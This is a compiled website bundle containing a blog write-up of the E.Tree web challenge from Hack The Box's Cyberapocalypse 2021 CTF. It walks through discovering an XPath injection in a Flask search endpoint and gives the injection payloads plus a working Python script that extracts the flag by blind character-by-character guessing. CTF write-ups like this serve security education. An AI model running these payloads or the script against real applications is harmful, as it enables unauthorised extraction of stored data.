"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[4870],{3905:(e,t,n)=>{n.d(t,{Zo:()=>p,kt:()=>m});var a=n(7294);function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function l(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function o(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?l(Object(n),!0).forEach((function(t){r(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):l(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function i(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},l=Object.keys(e);for(a=0;a<l.length;a++)n=l[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var l=Object.getOwnPropertySymbols(e);for(a=0;a<l.length;a++)n=l[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var s=a.createContext({}),c=function(e){var t=a.useContext(s),n=t;return e&&(n="function"==typeof e?e(t):o(o({},t),e)),n},p=function(e){var t=c(e.components);return a.createElement(s.Provider,{value:t},e.children)},f="mdxType",u={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},h=a.forwardRef((function(e,t){var n=e.components,r=e.mdxType,l=e.originalType,s=e.parentName,p=i(e,["components","mdxType","originalType","parentName"]),f=c(n),h=r,m=f["".concat(s,".").concat(h)]||f[h]||u[h]||l;return n?a.createElement(m,o(o({ref:t},p),{},{components:n})):a.createElement(m,o({ref:t},p))}));function m(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var l=n.length,o=new Array(l);o[0]=h;var i={};for(var s in t)hasOwnProperty.call(t,s)&&(i[s]=t[s]);i.originalType=e,i[f]="string"==typeof e?e:r,o[1]=i;for(var c=2;c<l;c++)o[c]=n[c];return a.createElement.apply(null,o)}return a.createElement.apply(null,n)}h.displayName="MDXCreateElement"},7604:(e,t,n)=>{n.d(t,{Z:()=>l});var a=n(7294);const r={"donate-card":"donate-card_mbts",bmac:"bmac_qmhE"};function l(){return a.createElement("div",{className:"alert alert--primary",role:"alert"},a.createElement("div",{className:"card__body"},a.createElement("p",null,"Thank you for reading!"),a.createElement("p",null,"The information in this blog, as well as all the tools, apps and libraries I develop are currently open source."),a.createElement("p",null,"I would love to keep it this way, and you can help!"),a.createElement("p",null,"You can buy me a coffee from here, which will go towards the next all-nighter I pull off!"),a.createElement("a",{href:"https://www.buymeacoffee.com/kblagoev",target:"_blank"},a.createElement("img",{src:"https://cdn.buymeacoffee.com/buttons/v2/default-violet.png",className:r.bmac,alt:"Buy Me A Coffee"})),a.createElement("p",null,"Or you can support me and my code monthly over at ",a.createElement("a",{href:"https://github.com/sponsors/tihawk",target:"_blank"},"Github Sponsors!")),a.createElement("p",null,"Thanks!")))}},1039:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>c,contentTitle:()=>i,default:()=>h,frontMatter:()=>o,metadata:()=>s,toc:()=>p});var a=n(7462),r=(n(7294),n(3905)),l=n(7604);const o={slug:"e-tree-cyberapocalypse-2021-ctf",title:"E.Tree - Cyberapocalypse 2021 CTF",description:"This is a writeup for the E.Tree challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Web.",authors:"kiroki",tags:["Cyber Security","CTF"]},i=void 0,s={permalink:"/blog/e-tree-cyberapocalypse-2021-ctf",source:"@site/blog/2021-04-29-22:14:02e-tree-cyberapocalypse-2021-ctf.md",title:"E.Tree - Cyberapocalypse 2021 CTF",description:"This is a writeup for the E.Tree challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Web.",date:"2021-04-29T00:00:00.000Z",formattedDate:"April 29, 2021",tags:[{label:"Cyber Security",permalink:"/blog/tags/cyber-security"},{label:"CTF",permalink:"/blog/tags/ctf"}],readingTime:3.39,hasTruncateMarker:!0,authors:[{name:"Kiril Panayotov Blagoev",title:"Admin",url:"https://github.com/tihawk",imageURL:"https://github.com/tihawk.png",key:"kiroki"}],frontMatter:{slug:"e-tree-cyberapocalypse-2021-ctf",title:"E.Tree - Cyberapocalypse 2021 CTF",description:"This is a writeup for the E.Tree challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Web.",authors:"kiroki",tags:["Cyber Security","CTF"]},prevItem:{title:"miniSTRypalace - Cyberapocalypse 2021 CTF",permalink:"/blog/ministrypalace-cyberapocalypse-2021-ctf"},nextItem:{title:"Phasestream 3 - Cyberapocalypse 2021 CTF",permalink:"/blog/phasestream-3-cyberapocalypse-2021-ctf"}},c={authorsImageUrls:[void 0]},p=[{value:"Prompt",id:"prompt",level:3},{value:"Recon",id:"recon",level:3},{value:"Analysis",id:"analysis",level:3},{value:"Solution",id:"solution",level:3}],f={toc:p},u="wrapper";function h(e){let{components:t,...o}=e;return(0,r.kt)(u,(0,a.Z)({},f,o,{components:t,mdxType:"MDXLayout"}),(0,r.kt)("p",null,"This is a writeup for the E.Tree challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Web."),(0,r.kt)("h3",{id:"prompt"},"Prompt"),(0,r.kt)("p",null,"After many years where humans work under the aliens commands, they have been gradually given access to some of their management applications. Can you hack this alien Employ Directory web app and contribute to the greater human rebellion?"),(0,r.kt)("h3",{id:"recon"},"Recon"),(0,r.kt)("p",null,"We are provided with an XML file, which indicate where the flag will be hidden"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-xml"},'<?xml version="1.0" encoding="utf-8"?>\n\n<military>\n    <district id="confidential">\n    \n        <staff>\n            <name>confidential</name>\n            <age>confidential</age>\n            <rank>confidential</rank>\n            <kills>confidential</kills>\n        </staff>\n        \n[REDACTED]\n        \n        <staff>\n            <name>confidential</name>\n            <age>confidential</age>\n            <rank>confidential</rank>\n            <kills>confidential</kills>\n            <selfDestructCode>CHTB{f4k3_fl4g</selfDestructCode>\n        </staff>\n        \n    </district>\n\n    <district id="confidential">\n    \n        <staff>\n            <name>confidential</name>\n            <age>confidential</age>\n            <rank>confidential</rank>\n            <kills>confidential</kills>\n        </staff>\n        <staff>\n            <name>confidential</name>\n            <age>confidential</age>\n            <rank>confidential</rank>\n            <kills>confidential</kills>\n            <selfDestructCode>_f0r_t3st1ng}</selfDestructCode>\n        </staff>\n        <staff>\n            <name>confidential</name>\n            <age>confidential</age>\n            <rank>confidential</rank>\n            <kills>confidential</kills>\n            \n        </staff>\n    </district>\n</military>\n')),(0,r.kt)("p",null,"We also have access to a site, which has a form connected to a POST endpoint  ",(0,r.kt)("inlineCode",{parentName:"p"},"/api/search"),". Giving it a string value would return either that it has found an entry or not."),(0,r.kt)("p",null,"It gets interesting though, if we pass to it something which starts with an apostrphe ",(0,r.kt)("inlineCode",{parentName:"p"},"'"),". If we pass that through Burpsuite for example, we will receive a response, that we've broken the application, with a very nice detailed error log."),(0,r.kt)("p",null,(0,r.kt)("img",{alt:"error log",src:n(3507).Z,width:"781",height:"938"})),(0,r.kt)("p",null,"This log reveals to us that the application is running Flask, but also more importantly it gives us the query (in fact the whole function) that it's running to respond to our POST request."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-python"},'#### File "/app/app.py", line _42_, in `search`\n\n@app.route("/api/search", methods=\\["POST"\\])\ndef search():\n name = request.json.get("search", "")\n query = "/military/district/staff\\[name=\'{}\'\\]".format(name)\n\n if tree.xpath(query):\n    return {"success": 1, "message": "This millitary staff member exists."}\n\n return {"failure": 1, "message": "This millitary staff member doesn\'t exist."}\n')),(0,r.kt)("p",null,"We can now clearly see that we're faced with the challenge of XPATH injection, and we also know where it occurs."),(0,r.kt)("h3",{id:"analysis"},"Analysis"),(0,r.kt)("p",null,"To test this out, I built the following data for the request, which would return true if the ",(0,r.kt)("inlineCode",{parentName:"p"},"selfDestructCode")," is to be found within the structure of our XML target."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"{\"search\": f\"x' or count(/selfDestructCode)=1 or 'x'='y\"}\n")),(0,r.kt)("p",null,"And since this gave us the a true response, we can now start building a request to test for a flag. For that, we are going to use another boolean-returning function, namely ",(0,r.kt)("inlineCode",{parentName:"p"},"starts-with"),"."),(0,r.kt)("h3",{id:"solution"},"Solution"),(0,r.kt)("p",null,"Since this will be a blind XML injection, we are going to have to be guessing each following symbol in our flag one by one, from a list of printable characters. Thankfully, we know how our flag starts, so this shouldn't be too difficult logistically. But, we have to not forget, that according to the XML file we were supplied with, the flag is split into two parts."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-xml"},"<selfDestructCode>CHTB{f4k3_fl4g</selfDestructCode>\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-xml"},"<selfDestructCode>_f0r_t3st1ng}</selfDestructCode>\n")),(0,r.kt)("p",null,"So let's write up the logic flow of our solution:"),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"We generate a list of printable characters to test for."),(0,r.kt)("li",{parentName:"ol"},"We start a loop, in which we test whether the flag starts with ",(0,r.kt)("inlineCode",{parentName:"li"},"CHTB{ + some_char"),"."),(0,r.kt)("li",{parentName:"ol"},"If it does, we add ",(0,r.kt)("inlineCode",{parentName:"li"},"some_char")," to our known flag, and continue onto the next character"),(0,r.kt)("li",{parentName:"ol"},"If we run through the whole list of printable characters, without finding a match, we assume we've found the end of the string."),(0,r.kt)("li",{parentName:"ol"},"We move onto the second part of the flag, but this time we have no knowledge of how it starts"),(0,r.kt)("li",{parentName:"ol"},"Repeat the loop process, and terminate with the same condition as in ",(0,r.kt)("inlineCode",{parentName:"li"},"4."))),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-python"},"#!/usr/bin/env python\n\nimport requests\nimport string\n\nurl = 'http://138.68.179.198:30435/api/search'\n\nlistOfPrintable = list(string.printable)\n\ndef getFlagStartingWith(flag):\n\n  while True:\n    foundOneNew = False\n    for char in listOfPrintable:\n      # have to assume the second part doesn't also start with a capital C\n      if len(flag) == 0 and char == 'C':\n        continue\n      flagAttempt = flag + char\n      data = {\"search\": f\"x' or //staff[starts-with(selfDestructCode, '{flagAttempt}')] or 'x'='y\"}\n    \n      r = requests.post(url, json=data)\n\n      check = '\"success\"' in r.text\n      if check == True:\n        flag += char\n        foundOneNew = True\n        print(flag)\n    if foundOneNew == False:\n      break\n  return flag\n\nfirstPartOfFlag = getFlagStartingWith('CHTB{')\nsecondPartOfFlag = getFlagStartingWith('')\nflag = firstPartOfFlag + secondPartOfFlag\nprint(flag)\n")),(0,r.kt)("p",null,"After a bit, this will spit our flag out"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"CHTB{Th3_3xTr4_l3v3l_4Cc3s$_c0nTr0l}\n")),(0,r.kt)(l.Z,{mdxType:"DonateCard"}))}h.isMDXComponent=!0},3507:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/xpath-error-6e3897b2c502fa8e57ab239c383a78ec.png"}}]);